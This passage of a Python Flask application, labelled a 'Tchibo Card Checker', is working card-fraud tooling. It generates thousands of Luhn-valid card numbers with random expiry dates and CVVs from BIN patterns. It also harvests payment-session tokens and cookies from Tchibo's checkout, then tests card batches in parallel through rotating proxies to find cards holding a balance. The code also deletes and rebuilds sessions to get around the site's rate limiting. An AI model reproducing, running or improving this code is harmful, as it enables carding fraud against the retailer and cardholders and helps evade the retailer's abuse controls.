                PROXY_STATUS['test_result'] = {
                    'success': True,
                    'ip': ip_address,
                    'response_time': response_time,
                    'type': 'rotation'
                }
                logger.info(f"Proxy OK: {ip_address} ({response_time}ms)")
                return True, f"Proxy OK - IP: {ip_address} ({response_time}ms)"
            else:
                PROXY_STATUS['last_test'] = datetime.now().isoformat()
                PROXY_STATUS['test_result'] = {
                    'success': False,
                    'error': f"HTTP {response.status_code}",
                    'response_time': response_time,
                    'type': 'rotation'
                }
                return False, f"Proxy test failed - HTTP {response.status_code}"
                
        except Exception as e:
            PROXY_STATUS['last_test'] = datetime.now().isoformat()
            PROXY_STATUS['test_result'] = {
                'success': False,
                'error': str(e),
                'response_time': None,
                'type': 'rotation'
            }
            return False, f"Proxy test error: {str(e)}"
    
    elif PROXY_STATUS['proxy_url']:
        try:
            start_time = time.time()
            proxy_config = {'http': PROXY_STATUS['proxy_url'], 'https': PROXY_STATUS['proxy_url']}
            test_url = "https://httpbin.org/ip"
            response = requests.get(test_url, proxies=proxy_config, timeout=10)
            end_time = time.time()
            response_time = int((end_time - start_time) * 1000)
            
            if response.status_code == 200:
                result = response.json()
                ip_address = result.get('origin', 'Unknown')
                PROXY_STATUS['last_test'] = datetime.now().isoformat()
                PROXY_STATUS['test_result'] = {
                    'success': True,
                    'ip': ip_address,
                    'response_time': response_time,
                    'type': 'manual'
                }
                logger.info(f"Proxy OK: {ip_address} ({response_time}ms)")
                return True, f"Proxy OK - IP: {ip_address} ({response_time}ms)"
            else:
                PROXY_STATUS['last_test'] = datetime.now().isoformat()
                PROXY_STATUS['test_result'] = {
                    'success': False,
                    'error': f"HTTP {response.status_code}",
                    'response_time': response_time,
                    'type': 'manual'
                }
                return False, f"Proxy test failed - HTTP {response.status_code}"
                
        except Exception as e:
            PROXY_STATUS['last_test'] = datetime.now().isoformat()
            PROXY_STATUS['test_result'] = {
                'success': False,
                'error': str(e),
                'response_time': None,
                'type': 'manual'
            }
            return False, f"Proxy test error: {str(e)}"
    
    return False, "No proxy configured"

def get_proxy_status():
    return {
        'is_set': PROXY_STATUS['is_set'],
        'proxy_url': PROXY_STATUS['proxy_url'],
        'last_test': PROXY_STATUS['last_test'],
        'test_result': PROXY_STATUS['test_result'],
        'rotation_enabled': PROXY_STATUS['rotation_enabled'],
        'current_proxy': PROXY_STATUS['current_proxy']
    }

def luhn_checksum(card_number):
    """Luhn algorithm to validate card number"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number):
    """Check if card number is valid using Luhn algorithm"""
    return luhn_checksum(card_number) == 0

def calculate_luhn(partial_card_number):
    """Calculate check digit for partial card number"""
    check_digit = luhn_checksum(int(partial_card_number) * 10)
    return str((10 - check_digit) % 10)

def generate_card_number(bin_pattern):
    """Generate card number from BIN pattern"""
    card_length = 16
    
    for attempt in range(500):
        card_number = ''
        for char in bin_pattern.lower():
            if char == 'x':
                card_number += str(random.randint(0, 9))
            elif char.isdigit():
                card_number += char
        
        while len(card_number) < card_length:
            card_number += str(random.randint(0, 9))
        
        card_number = card_number[:card_length]
        
        partial = card_number[:-1]
        check_digit = calculate_luhn(partial)
        card_number = partial + check_digit
        
        if is_luhn_valid(card_number):
            return card_number
    
    card_number = ''
    for char in bin_pattern.lower():
        if char == 'x':
            card_number += str(random.randint(0, 9))
        elif char.isdigit():
            card_number += char
    
    while len(card_number) < card_length:
        card_number += str(random.randint(0, 9))
    
    card_number = card_number[:card_length]
    partial = card_number[:-1]
    check_digit = calculate_luhn(partial)
    return partial + check_digit

def run_async_safe(coro):
    """Run async coroutine safely"""
    try:
        loop = asyncio.get_running_loop()
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(asyncio.run, coro)
            return future.result()
    except RuntimeError:
        return asyncio.run(coro)

def process_cards_parallel(cards):
    """Process cards with async checker"""
    run_async_safe(process_cards_async(cards))

async def process_cards_async(cards):
    """Process cards asynchronously"""
    global processing_status, results_queue, invalids_queue
    
    try:
        processing_status["is_processing"] = True
        processing_status["total_cards"] = len(cards)
        processing_status["processed_cards"] = 0
        processing_status["successful_cards"] = 0
        processing_status["hits"] = 0
        processing_status["invalids"] = 0
        
        with results_lock:
            results_queue.clear()
            invalids_queue.clear()
        
        logger.info(f"🚀 Processing {len(cards)} cards...")
        
        start_time = time.time()
        
        checker = TchiboFastChecker(num_workers=999)
        
        logger.info("📞 Calling checker.check_cards_parallel()...")
        results, elapsed = await checker.check_cards_parallel(cards)
        logger.info(f"✅ checker.check_cards_parallel() returned {len(results)} results in {elapsed:.1f}s")
        
        hits = [r for r in results if isinstance(r, dict) and r.get('success') and r.get('points', 0) > 0]
        zeros = [r for r in results if isinstance(r, dict) and r.get('success') and r.get('points', 0) == 0]
        errors = [r for r in results if isinstance(r, dict) and not r.get('success')]
        
        rate_limited_errors = [e for e in errors if e.get('rate_limited') or 'rate limited' in e.get('error', '').lower() or 'çok fazla' in e.get('error', '').lower()]
        rate_limit_percentage = (len(rate_limited_errors) / len(results) * 100) if len(results) > 0 else 0
        
        logger.info(f"📊 Analysis: {len(hits)} hits, {len(zeros)} zeros, {len(errors)} errors")
        
        if rate_limit_percentage > 50:
            logger.warning(f"⚠️  RATE LIMITED: {len(rate_limited_errors)} cards ({rate_limit_percentage:.1f}%) - Sessions are burned!")
            logger.warning(f"🔄 AUTO-REFRESHING SESSIONS: Deleting old sessions and waiting 30 seconds...")
            
            try:
                import os
                if os.path.exists('sessions_database.json'):
                    os.remove('sessions_database.json')
                    logger.info(f"✅ Deleted sessions_database.json")
            except Exception as e:
                logger.error(f"❌ Failed to delete sessions: {e}")
            
            checker.session_pool.sessions = []
            checker.session_pool.initialized = False
            
            logger.warning(f"⏰ Waiting 30 seconds for rate limit to clear...")
            import asyncio
            await asyncio.sleep(30)
            
            logger.info(f"💡 Sessions cleared! Please create fresh sessions before checking again.")
            logger.info(f"💡 Tip: Wait 5-10 minutes OR use different proxy to fully avoid rate limit")
        
        with results_lock:
            processing_status["processed_cards"] = len(results) if results else processing_status["processed_cards"]
            processing_status["successful_cards"] = len(results_queue)
        
        import sys
        
        rate_limit_warning = ""
        if rate_limit_percentage > 50:
            rate_limit_warning = f"""
⚠️  WARNING: {rate_limit_percentage:.1f}% RATE LIMITED!
Sessions are burned. Fresh sessions needed.
Wait 5-10 min OR use different proxy.
"""
        
        summary_text = f"""
{'='*60}
                    SUMMARY
{'='*60}
Total cards:      {len(results)}
✅ Success (0 TL): {len(zeros)}
🎯 Hits (>0 TL):  {len(hits)}
❌ Errors:        {len(errors)}
⏱️  Time:         {elapsed:.1f}s
⚡ Speed:         {len(results)/elapsed:.1f} cards/s
{'='*60}{rate_limit_warning}
"""
        logger.info(summary_text)
        print(summary_text, file=sys.stderr, flush=True)
        print(summary_text, flush=True)
        
        try:
            with open('last_check_results.txt', 'w', encoding='utf-8') as f:
                f.write(summary_text)
        except:
            pass
        
        if len(hits) > 0:
            hits_text = f"\n🎯 HIT CARDS ({len(hits)} cards with points):\n"
            for i, hit in enumerate(hits[:20], 1):
                hits_text += f"  {i}. {hit['card']}: {hit['points']:.2f} TL\n"
            logger.info(hits_text)
            print(hits_text, file=sys.stderr, flush=True)
            print(hits_text, flush=True)
            
            try:
                with open('last_check_results.txt', 'a', encoding='utf-8') as f:
                    f.write(hits_text)
            except:
                pass
        
        error_rate = (len(errors) / len(results) * 100) if len(results) > 0 else 0
        if len(errors) > 0 and error_rate > 50:
            from collections import Counter
            error_types = Counter([err.get('error', 'Unknown')[:50] for err in errors])
            
            logger.info(f"\n📋 Error Analysis ({len(errors)} total errors, {error_rate:.1f}% error rate):")
            logger.info(f"\n🔍 Top 5 error types:")
            for error_msg, count in error_types.most_common(5):
                percentage = (count / len(errors) * 100)
                logger.info(f"  • {error_msg}: {count} ({percentage:.1f}%)")
            
            logger.info(f"\n📄 Sample errors (first 5):")
            for i, err in enumerate(errors[:5]):
                logger.info(f"  {i+1}. {err.get('card', 'N/A')}: {err.get('error', 'Unknown error')}")
        
    except Exception as e:
        import traceback
        logger.error(f"\n{'='*60}")
        logger.error(f"❌ FATAL ERROR in process_cards_async:")
        logger.error(f"{'='*60}")
        logger.error(f"Exception: {e}")
        logger.error(f"Traceback:\n{traceback.format_exc()}")
        logger.error(f"{'='*60}")
    finally:
        processing_status["is_processing"] = False
        import sys
        completion_msg = "\n✅ process_cards_async() COMPLETED\n"
        logger.info(completion_msg)
        print(completion_msg, file=sys.stderr, flush=True)
        print(completion_msg, flush=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/status')
def get_status():
    return jsonify(processing_status)

@app.route('/get_status')
def get_status_alt():
    return jsonify(processing_status)

@app.route('/get_results')
def get_results():
    with results_lock:
        hits = results_queue.copy()
        invalids = invalids_queue.copy()
        hits.sort(key=lambda x: x.get('points', 0), reverse=True)
    return jsonify({
        'results': hits,
        'hits': hits,
        'invalids': invalids,
        'hits_count': len(hits),
        'invalids_count': len(invalids)
    })

@app.route('/process_cards', methods=['POST'])
def process_cards():
    try:
        if processing_status["is_processing"]:
            return jsonify({'error': 'Already processing cards. Please wait.'}), 409
        
        data = request.get_json()
        cards_text = data.get('cards', '')
        
        if not cards_text.strip():
            return jsonify({'error': 'Card data is empty'}), 400
        
        cards = []
        lines = cards_text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            parts = line.split('|')
            if len(parts) != 4:
                continue
                
            cards.append(line)
        
        if not cards:
            return jsonify({'error': 'No valid cards found'}), 400
        
        thread = threading.Thread(target=process_cards_parallel, args=(cards,))
        thread.daemon = True
        thread.start()
        
        return jsonify({'message': f'{len(cards)} cards processing started'})
        
    except Exception as e:
        logger.error(f"Error processing cards: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/generate-cards', methods=['POST'])
def generate_cards_api():
    try:
        data = request.get_json()
        bin_pattern = data.get('bin', '').strip()
        
        try:
            quantity = int(data.get('quantity', 10))
        except (ValueError, TypeError):
            return jsonify({'success': False, 'error': 'Invalid quantity value'}), 400
        
        month = data.get('month', '').strip()
        year = data.get('year', '').strip()
        cvv = data.get('cvv', '').strip()
        
        if not bin_pattern or len(bin_pattern) < 6:
            return jsonify({'success': False, 'error': 'BIN must be at least 6 digits'}), 400
        
        if quantity < 1 or quantity > 50000:
            return jsonify({'success': False, 'error': 'Quantity must be 1-50000'}), 400
        
        cards = []
        current_year = datetime.now().year
        
        for i in range(quantity):
            card_number = generate_card_number(bin_pattern)
            
            if month:
                try:
                    month_int = int(month)
                    if 1 <= month_int <= 12:
                        card_month = f"{month_int:02d}"
                    else:
                        card_month = f"{random.randint(1, 12):02d}"
                except (ValueError, TypeError):
                    card_month = f"{random.randint(1, 12):02d}"
            else:
                card_month = f"{random.randint(1, 12):02d}"
            
            if year:
                try:
                    year_int = int(year)
                    if year_int < 100:
                        if year_int >= 0:
                            card_year = str(year_int)
                        else:
                            card_year = str(random.randint(current_year, current_year + 8))
                    else:
                        if year_int >= current_year:
                            card_year = str(year_int)
                        else:
                            card_year = str(random.randint(current_year, current_year + 8))
                except (ValueError, TypeError):
                    card_year = str(random.randint(current_year, current_year + 8))
            else:
                card_year = str(random.randint(current_year, current_year + 8))
            
            if cvv:
                card_cvv = cvv
                card_cvv = ''.join(c for c in card_cvv if c.isdigit())
                while len(card_cvv) < 3:
                    card_cvv += str(random.randint(0, 9))
                card_cvv = card_cvv[:4]
            else:
                card_cvv = f"{random.randint(0, 999):03d}"
            
            cards.append(f"{card_number}|{card_month}|{card_year}|{card_cvv}")
        
        logger.info(f"Generated {len(cards)} cards with BIN: {bin_pattern}")
        
        return jsonify({
            'success': True,
            'cards': cards,
            'count': len(cards)
        })
        
    except Exception as e:
        logger.error(f"Error generating cards: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy', methods=['GET'])
def get_proxy_api():
    try:
        status = get_proxy_status()
        return jsonify({'success': True, **status})
    except Exception as e:
        logger.error(f"Error getting proxy status: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy', methods=['POST'])
def set_proxy_api():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'Invalid JSON'}), 400
            
        proxy_string = data.get('proxy_url', '').strip()
        
        if not proxy_string:
            return jsonify({'success': False, 'error': 'Proxy string is empty'}), 400
        
        success, message = set_proxy(proxy_string)
        return jsonify({'success': success, 'message': message})
    except Exception as e:
        logger.error(f"Error setting proxy: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy', methods=['DELETE'])
def clear_proxy_api():
    try:
        success, message = clear_proxy()
        return jsonify({'success': success, 'message': message})
    except Exception as e:
        logger.error(f"Error clearing proxy: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy/test', methods=['POST'])
def test_proxy_api():
    try:
        success, result = test_proxy()
        if success:
            return jsonify({'success': True, 'message': result})
        else:
            return jsonify({'success': False, 'error': result})
    except Exception as e:
        logger.error(f"Error testing proxy: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy/rotation', methods=['POST'])
def proxy_rotation_api():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'Invalid JSON'}), 400
        
        action = data.get('action')
        
        if action == 'enable':
            PROXY_STATUS['rotation_enabled'] = True
            PROXY_STATUS['is_set'] = False
            PROXY_STATUS['proxy_url'] = None
            save_proxy_config()
            logger.info("Proxy rotation enabled")
            return jsonify({'success': True, 'message': 'Proxy rotation enabled'})
        elif action == 'disable':
            PROXY_STATUS['rotation_enabled'] = False
            save_proxy_config()
            logger.info("Proxy rotation disabled")
            return jsonify({'success': True, 'message': 'Proxy rotation disabled'})
        else:
            return jsonify({'success': False, 'error': 'Invalid action'}), 400
            
    except Exception as e:
        logger.error(f"Error with proxy rotation: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy/reset', methods=['POST'])
def proxy_reset_api():
    try:
        reset_proxies()
        logger.info("Proxies reset")
        return jsonify({'success': True, 'message': 'Proxies reset successfully'})
    except Exception as e:
        logger.error(f"Error resetting proxies: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy/stats', methods=['GET'])
def proxy_stats_api():
    try:
        stats = get_proxy_stats()
        return jsonify({'success': True, 'stats': stats})
    except Exception as e:
        logger.error(f"Error getting proxy stats: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions', methods=['GET'])
def get_sessions_api():
    try:
        sessions = get_all_sessions()
        return jsonify({'success': True, 'sessions': sessions})
    except Exception as e:
        logger.error(f"Error getting sessions: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions/<int:session_id>', methods=['DELETE'])
def delete_session_api(session_id):
    try:
        success, message = delete_session(session_id)
        return jsonify({'success': success, 'message': message})
    except Exception as e:
        logger.error(f"Error deleting session {session_id}: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions/active', methods=['GET'])
def get_active_sessions_api():
    try:
        sessions = get_active_sessions()
        return jsonify({'success': True, 'sessions': sessions, 'count': len(sessions)})
    except Exception as e:
        logger.error(f"Error getting active sessions: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/sessions/create', methods=['POST'])
def create_sessions_api():
    """Create payment sessions for card checking"""
    try:
        data = request.get_json()
        count = int(data.get('count', 1))
        
        if count < 1 or count > 500:
            return jsonify({'success': False, 'error': '1-500'}), 400
        
        logger.info(f"\n{'='*60}")
        logger.info(f"🚀 Creating {count} payment sessions...")
        logger.info(f"{'='*60}")
        import sys
        sys.stdout.flush()
        
        start_time = time.time()
        collected = 0
        failed = 0
        
        session_pool = SessionPool(pool_size=count)
        
        async def init_sessions():
            nonlocal collected, failed
            await session_pool.initialize_pool()
            
            existing_sessions = get_all_sessions()
            base_session_id = len(existing_sessions)
            
            for i, session_data in enumerate(session_pool.sessions):
                if not isinstance(session_data, dict) or not session_data.get('success'):
                    failed += 1
                    continue
                
                worker = session_data.get('worker')
                if not worker or not worker.token or not worker.secret:
                    failed += 1
                    logger.debug(f"Session {i}: Missing worker or credentials")
                    continue
                
                collected += 1
                
                if worker.automation and worker.automation.session:
                    worker.cookies_dict = {}
                    
                    try:
                        for cookie in worker.automation.session.cookies:
                            if hasattr(cookie, 'name') and hasattr(cookie, 'value'):
                                worker.cookies_dict[cookie.name] = cookie.value
                    except:
                        pass
                    
                    try:
                        for name, value in worker.automation.session.cookies.items():
                            worker.cookies_dict[name] = value
                    except:
                        pass
                    
                    try:
                        if hasattr(worker.automation.session.cookies, 'get_dict'):
                            cookie_dict = worker.automation.session.cookies.get_dict()
                            worker.cookies_dict.update(cookie_dict)
                    except:
                        pass
                    
                    if worker.automation.payment_xcsrf:
                        worker.cookies_dict['PaymentXCSRF'] = worker.automation.payment_xcsrf
                    
                    if hasattr(worker.automation, 'payment_session_id') and worker.automation.payment_session_id:
                        worker.cookies_dict['Payment.SessionId'] = worker.automation.payment_session_id
                    if hasattr(worker.automation, 'loadbalancepsp') and worker.automation.loadbalancepsp:
                        worker.cookies_dict['loadbalancepsp'] = worker.automation.loadbalancepsp
                    if hasattr(worker.automation, 'l_fm_mid') and worker.automation.l_fm_mid:
                        worker.cookies_dict['l-fm-mid'] = worker.automation.l_fm_mid
                
                session_id = base_session_id + i + 1
                payment_data = {
                    **worker.cookies_dict,
                    'payment_token': worker.token,
                    'payment_secret': worker.secret,
                    'payment_xcsrf': worker.payment_xcsrf,
                    'ctrl_key': worker.ctrl_key,
                    'pg_process_key': worker.pg_process_key
                }
                
                cookie_count = len([k for k in payment_data.keys() if k not in ['payment_token', 'payment_secret', 'payment_xcsrf', 'ctrl_key', 'pg_process_key']])
                
                success, msg = add_session(
                    email=f"payment_session_{session_id}@tchibo.local",
                    password="",
                    session_id=session_id,
                    session_token=worker.token,
                    user_id=str(worker.secret),
                    cookies=payment_data
                )
                
                if success:
                    logger.info(f"   💾 Session {i+1} saved to database (ID: {session_id}, {cookie_count} cookies)")
                else:
                    logger.warning(f"   ⚠️ Session {i+1} failed to save: {msg}")
            
            failed = count - collected
        
        try:
            run_async_safe(init_sessions())
        except Exception as e:
            logger.error(f"Error in async session initialization: {e}")
        
        elapsed = time.time() - start_time
        
        logger.info(f"{'='*60}")
        logger.info(f"✅ Session creation complete: {collected} ok / {failed} fail")
        logger.info(f"⏱️  Time: {elapsed:.1f}s")
        logger.info(f"{'='*60}\n")
        
        _original_print(f"\n{'='*60}")
        _original_print(f"✅ Session creation complete: {collected} ok / {failed} fail")
        _original_print(f"⏱️  Time: {elapsed:.1f}s")
        _original_print(f"{'='*60}\n")
        sys.stdout.flush()
        
        return jsonify({
            'success': True, 
            'message': f'{collected} sessions created',
            'collected': collected,
            'failed': failed,
            'time': round(elapsed, 1)
        })
        
    except Exception as e:
        import traceback
        error_details = traceback.format_exc()
        logger.error(f"Session creation error: {e}")
        logger.error(f"Traceback:\n{error_details}")
        return jsonify({'success': False, 'error': f'Error: {str(e)}'}), 500

@app.route('/api/sessions/clear', methods=['POST'])
def clear_sessions_api():
    try:
        db = {"sessions": [], "next_id": 1}
        if save_sessions_database(db):
            logger.info("Sessions cleared")
            global _global_session_pool
            if _global_session_pool:
                _global_session_pool.sessions = []
                _global_session_pool.initialized = False
            return jsonify({'success': True, 'message': 'Sessions cleared'})
        else:
            return jsonify({'success': False, 'error': 'Failed'}), 500
    except Exception as e:
        logger.error(f"Error clearing sessions: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    saved_config = load_proxy_config()
    if saved_config:
        PROXY_STATUS['is_set'] = saved_config.get('is_set', False)
        PROXY_STATUS['proxy_url'] = saved_config.get('proxy_url')
        PROXY_STATUS['rotation_enabled'] = saved_config.get('rotation_enabled', True)
        if PROXY_STATUS['is_set'] and PROXY_STATUS['proxy_url']:
            logger.info(f"Loaded saved proxy: {PROXY_STATUS['proxy_url'].split('@')[1] if '@' in PROXY_STATUS['proxy_url'] else 'N/A'}")
    
    _original_print(f"\n{'='*60}")
    _original_print(f"  Tchibo Card Checker v{__version__} - by {__author__}")
    _original_print(f"{'='*60}\n")
    logger.info(f"Starting server by {__author__}...")
    logger.info("http://localhost:5000")
    app.run(debug=True, host='0.0.0.0', port=5000)

    logger.info(f"Starting server by {__author__}...")
    logger.info("http://localhost:5000")
    app.run(debug=True, host='0.0.0.0', port=5000)
